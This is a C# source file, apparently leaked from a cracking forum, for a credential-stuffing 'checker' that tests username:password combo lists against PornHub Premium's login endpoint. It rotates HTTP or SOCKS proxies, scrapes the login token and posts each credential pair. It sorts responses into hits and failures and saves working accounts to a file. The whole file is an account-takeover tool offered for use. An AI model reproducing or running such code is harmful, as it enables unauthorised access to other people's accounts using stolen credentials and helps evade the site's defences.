using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Threading;

namespace PornHubChecker
{
  internal class CheckerHelper
  {
    public static int total;
    public static int bad = 0;
    public static int hits = 0;
    public static int err = 0;
    public static int check = 0;
    public static int accindex = 0;
    public static List<string> proxies = new List<string>();
    public static string proxytype = "";
    public static int proxyindex = 0;
    public static int proxytotal = 0;
    public static int stop = 0;
    public static List<string> accounts = new List<string>();
    public static int CPM = 0;
    public static int CPM_aux = 0;
    public static int threads;

    public static void LoadCombos(string fileName)
    {
      using (FileStream fileStream = File.Open(fileName, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
      {
        using (BufferedStream bufferedStream = new BufferedStream((Stream) fileStream))
        {
          using (StreamReader streamReader = new StreamReader((Stream) bufferedStream))
          {
            while (streamReader.ReadLine() != null)
              ++CheckerHelper.total;
          }
        }
      }
    }

    public static void LoadProxies(string fileName)
    {
      using (FileStream fileStream = File.Open(fileName, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
      {
        using (BufferedStream bufferedStream = new BufferedStream((Stream) fileStream))
        {
          using (StreamReader streamReader = new StreamReader((Stream) bufferedStream))
          {
            while (streamReader.ReadLine() != null)
              ++CheckerHelper.proxytotal;
          }
        }
      }
    }

    public static void UpdateTitle()
    {
      while (true)
      {
        CheckerHelper.CPM = CheckerHelper.CPM_aux;
        CheckerHelper.CPM_aux = 0;
        Colorful.Console.Title = string.Format("[ ProHub | PornHub Checker | Made by ThieX | https://cracked.to/ThieX | Code Leaked By Lil_Eye Checked: {0}/{1} | Hits: {2} | Bad: {3} | Errors: {4} | CPM: ", (object) CheckerHelper.check, (object) CheckerHelper.total, (object) CheckerHelper.hits, (object) CheckerHelper.bad, (object) CheckerHelper.err) + (object) (CheckerHelper.CPM * 60) + " ] ";
        Thread.Sleep(1000);
      }
    }

    public static void Check()
    {
      while (true)
      {
        if (CheckerHelper.proxyindex > CheckerHelper.proxies.Count<string>() - 2)
          goto label_24;
label_1:
        try
        {
          Interlocked.Increment(ref CheckerHelper.proxyindex);
          using (HttpRequest httpRequest = new HttpRequest())
          {
            if (CheckerHelper.accindex >= CheckerHelper.accounts.Count<string>())
            {
              ++CheckerHelper.stop;
              break;
            }
            Interlocked.Increment(ref CheckerHelper.accindex);
            string[] strArray = CheckerHelper.accounts[CheckerHelper.accindex].Split(':', ';', '|');
            string str1 = strArray[0] + ":" + strArray[1];
            try
            {
              if (CheckerHelper.proxytype == "HTTP")
              {
                httpRequest.Proxy = (ProxyClient) HttpProxyClient.Parse(CheckerHelper.proxies[CheckerHelper.proxyindex]);
                httpRequest.Proxy.ConnectTimeout = 5000;
              }
              if (CheckerHelper.proxytype == "SOCKS4")
              {
                httpRequest.Proxy = (ProxyClient) Socks4ProxyClient.Parse(CheckerHelper.proxies[CheckerHelper.proxyindex]);
                httpRequest.Proxy.ConnectTimeout = 5000;
              }
              if (CheckerHelper.proxytype == "SOCKS5")
              {
                httpRequest.Proxy = (ProxyClient) Socks5ProxyClient.Parse(CheckerHelper.proxies[CheckerHelper.proxyindex]);
                httpRequest.Proxy.ConnectTimeout = 5000;
              }
              if (CheckerHelper.proxytype == "PROXYLESS")
                httpRequest.Proxy = (ProxyClient) null;
              httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36";
              httpRequest.KeepAlive = true;
              httpRequest.IgnoreProtocolErrors = true;
              httpRequest.ConnectTimeout = 5000;
              httpRequest.Cookies = (CookieStorage) null;
              httpRequest.UseCookies = true;
              string str2 = CheckerHelper.Parse(httpRequest.Get("https://www.pornhubpremium.com/premium/login").ToString(), "name=\"token\" value=\"", "\"");
              string str3 = "username=" + strArray[0] + "&password=" + strArray[1] + "&token=" + str2 + "&redirect=&from=pc_premium_login&segment=straight";
              string str4 = httpRequest.Post("https://www.pornhubpremium.com/front/authenticate", str3, "application/x-www-form-urlencoded; charset=UTF-8").ToString();
              if (str4.Contains(":\"1\",\"remember"))
              {
                ++CheckerHelper.CPM_aux;
                ++CheckerHelper.check;
                ++CheckerHelper.hits;
                Colorful.Console.WriteLine("                                        [+] " + str1, Color.LawnGreen);
                continue;
              }
              if (str4.Contains("Invalid username"))
              {
                ++CheckerHelper.CPM_aux;
                ++CheckerHelper.check;
                ++CheckerHelper.bad;
                Colorful.Console.WriteLine("                                        [-] " + str1, Color.DarkRed);
                continue;
              }
              CheckerHelper.accounts.Add(str1);
              continue;
            }
            catch (Exception ex)
            {
              CheckerHelper.accounts.Add(str1);
              continue;
            }
          }
        }
        catch
        {
          Interlocked.Increment(ref CheckerHelper.err);
          continue;
        }
label_24:
        CheckerHelper.proxyindex = 0;
        goto label_1;
      }
    }

    public static void SaveData(string account)
    {
      try
      {
        using (StreamWriter streamWriter = File.AppendText("hits.txt"))
          streamWriter.WriteLine(account);
      }
      catch
      {
      }
    }

    private static string Parse(string source, string left, string right) => source.Split(new string[1]
    {
      left
    }, StringSplitOptions.None)[1].Split(new string[1]
    {
      right
    }, StringSplitOptions.None)[0];
  }
}
